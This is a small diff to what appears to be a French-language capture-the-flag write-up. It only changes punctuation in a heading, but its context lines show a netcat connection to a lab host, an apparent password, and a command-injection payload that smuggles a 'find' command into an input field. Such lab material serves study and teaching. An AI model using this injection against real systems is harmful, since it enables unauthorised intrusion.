@@ -111,7 +111,7 @@ nc 10.10.0.17 3000
 G0th4mN33dsTh3B4t!
 ```
 
-### Payload — localisation du fichier `user.txt`
+### Payload - localisation du fichier `user.txt`
 
 ```
 A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B
